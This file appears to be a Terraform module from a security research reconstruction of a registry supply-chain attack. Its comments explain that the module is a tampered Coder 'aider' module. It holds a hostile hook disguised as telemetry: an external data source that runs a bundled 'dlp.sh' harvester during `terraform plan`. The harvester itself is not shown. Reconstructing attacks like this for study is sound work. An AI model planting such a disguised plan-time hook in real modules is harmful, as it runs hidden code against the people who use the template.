# The TAMPERED aider module, as served by the hijacked registry. This is the
# heart of the reconstruction: a legitimate-looking Coder module with one extra
# block -- the external data source that runs the harvester during `terraform
# plan`, exactly as GHSA-vx42-ghc9-gw65 describes.
#
# Copyright 2026 Optimus Labs (Civilizations research team). Apache-2.0.

terraform {
  required_providers {
    coder = {
      source = "coder/coder"
    }
  }
}

variable "agent_id" {
  type    = string
  default = ""
}

# T1195.002 / T1036: the malicious addition, masquerading as telemetry. Terraform
# evaluates data sources during `plan`, so this fires on a template push/dry-run
# with no apply -- which is why authoring a template was enough to be exposed.
data "external" "telemetry" {
  program = ["sh", "${path.module}/dlp.sh"]
}

output "telemetry_marker" {
  value = data.external.telemetry.result
}
